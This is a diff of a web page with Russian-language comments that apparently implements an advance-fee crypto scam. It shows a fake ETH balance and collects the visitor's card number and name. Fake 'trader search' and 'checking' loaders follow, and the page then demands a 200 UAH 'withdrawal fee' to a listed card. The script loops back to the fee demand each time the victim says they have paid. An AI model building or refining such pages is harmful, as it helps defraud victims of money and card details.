@@ -6,7 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Work.ui</title>
-    <link rel="stylesheet" href="./css/style.css">
+    <link rel="stylesheet" href="./css/style.css?ver=1213">
 </head>
 
 <body>
@@ -21,7 +21,9 @@
         <p class="balance">0.346 ETH</p>
         <p class="descr">EXAMPLE 3500 UAH</p>
 
-        <div class="content wrap">
+        <!-- 1 ---------------->
+
+        <div class="content wrap active">
             <p class="full">
                 <span class="descr">Senders address</span>
                 <span class="title">09f8a0980922809sd0f89080098128fs908qwdqw</span>
@@ -42,12 +44,104 @@
                 <span class="descr">Status</span>
                 <span class="title">Active</span>
             </p>
-            <a href="./card.html" class="btn">Получить</a>
+            <button class="btn">Получить</button>
         </div>
 
+        <!-- 2 --------------->
+
+        <div class="content">
+            <fieldset>
+                <label>Enter card number</label>
+                <input type="tel" id="cardNumber" required placeholder="0000-0000-0000-0000">
+            </fieldset>
+            <fieldset>
+                <label>Enter the recipient's first and last name</label>
+                <input type="tel" id="inputField" required placeholder="JON DOE">
+            </fieldset>
+            <button class="btn" disabled type="submit" id="submit">Далее</button>
+        </div>
+
+        <!-- 3 ------------------->
+
+        <div class="content">
+            <p class="descr big">Treder Search</p>
+            <img src="./img/loader.gif" class="loader" alt="loader">
+        </div>
+
+        <!-- 4 ------------------->
+
+        <div class="content wrap">
+            <p class="full">
+                <span class="descr big">Payment of withdrawal fees</span>
+            </p>
+            <p class="half">
+                <span class="descr">Amount of Commision</span>
+                <span class="title">200 UAH</span>
+            </p>
+            <p class="half">
+                <span class="descr">Recipient's name</span>
+                <span class="title">Ivan Ivanov</span>
+            </p>
+            <p class="full">
+                <span class="descr big">Card Number</span>
+                <button class="title copy" id="copyBtn">5555 6666 7777 8888</button>
+            </p>
+            <button class="btn">Я оплатил комиссию </button>
+        </div>
+
+        <!-- 5 ----------- -->
+
+        <div class="content">
+            <p class="descr big">Checking</p>
+            <img src="./img/loader.gif" class="loader" alt="loader">
+        </div>
+
+        <!-- 6 --------------- -->
+
+        <div class="content wrap">
+            <p class="full">
+                <span class="descr big">Payment was not found, try again click again</span>
+            </p>
+            <p class="half">
+                <span class="descr">Amount of Commision</span>
+                <span class="title">200 UAH</span>
+            </p>
+            <p class="half">
+                <span class="descr">Recipient's name</span>
+                <span class="title">Ivan Ivanov</span>
+            </p>
+            <p class="full">
+                <span class="descr big">Card Number</span>
+                <button class="title copy">5555 6666 7777 8888</button>
+            </p>
+            <button class="btn">Я оплатил комиссию</button>
+        </div>
+
+
+
     </main>
+    <script src="./js/inputmask.min.js"></script>
 
     <script>
+        const cardNumberInput = document.getElementById("cardNumber");
+        const inputFieldInput = document.getElementById("inputField");
+        const submitButton = document.getElementById("submit");
+
+        function validateInputs() {
+            const cardNumberValue = cardNumberInput.value;
+            const inputFieldValue = inputFieldInput.value;
+
+            if (cardNumberValue.length === 19 && inputFieldValue.length >= 5) {
+                submitButton.disabled = false;
+            } else {
+                submitButton.disabled = true;
+            }
+        }
+
+        cardNumberInput.addEventListener("input", validateInputs);
+        inputFieldInput.addEventListener("input", validateInputs);
+
+
         const dateEl = document.getElementById('date');
         const date = new Date();
         date.setDate(date.getDate() + 1);
@@ -58,6 +152,77 @@
         const minutes = date.getMinutes().toString().padStart(2, '0');
         const formattedDate = `${day}/${month}/${year} ${hours}:${minutes}`;
         dateEl.innerHTML = formattedDate;
+
+        Inputmask("9999-9999-9999-9999").mask(document.querySelector("#cardNumber"));
+
+        // Получаем ссылку на поле ввода по id
+        let inputField = document.getElementById("inputField");
+
+        // Добавляем обработчик события "input" к полю ввода
+        inputField.addEventListener("input", function (event) {
+            // Получаем значение, введенное в поле ввода
+            let inputValue = event.target.value;
+
+            // Удаляем все символы, кроме букв кириллицы и латиницы
+            let lettersOnly = inputValue.replace(/[^а-яА-Яa-zA-Z]/g, "");
+
+            // Если новое значение отличается от оригинала, обновляем поле ввода
+            if (inputValue !== lettersOnly) {
+                event.target.value = lettersOnly;
+            }
+        });
+
+        const button = document.getElementById('copyBtn');
+        button.addEventListener('click', () => {
+            const content = button.textContent;
+            navigator.clipboard.writeText(content)
+                .then(() => console.log(`Скопировано: ${content}`))
+                .catch((error) => console.error(`Ошибка копирования: ${error}`));
+        });
+
+
+        const contents = document.querySelectorAll('.content');
+        const btns = document.querySelectorAll('.btn');
+        let currentContentIndex = 0;
+
+        btns.forEach(function (btn) {
+            btn.addEventListener('click', function () {
+                // Скрываем текущий отображаемый div и удаляем класс "active"
+                contents[currentContentIndex].classList.remove('active');
+                contents[currentContentIndex].style.display = 'none';
+
+                // Увеличиваем индекс для отображения следующего div'а
+                currentContentIndex++;
+
+                // Если мы отобразили последний div, начинаем с начала
+                if (currentContentIndex >= contents.length) {
+                    currentContentIndex = 4;
+                }
+
+                // Если мы отображаем третий div, запускаем таймер на 4 секунды
+                if (currentContentIndex === 2 || currentContentIndex === 4) {
+                    setTimeout(function () {
+                        // Скрываем текущий отображаемый div и удаляем класс "active"
+                        contents[currentContentIndex].classList.remove('active');
+                        contents[currentContentIndex].style.display = 'none';
+
+                        // Отображаем следующий div и добавляем класс "active"
+                        currentContentIndex++;
+                        contents[currentContentIndex].classList.add('active');
+                        // contents[currentContentIndex].style.display = 'block';
+                    }, 4000);
+                }
+
+                // Отображаем следующий div и добавляем класс "active"
+                contents[currentContentIndex].classList.add('active');
+                contents[currentContentIndex].style.display = 'block';
+            });
+        });
+
+
+
+
+
     </script>
 
 </body>
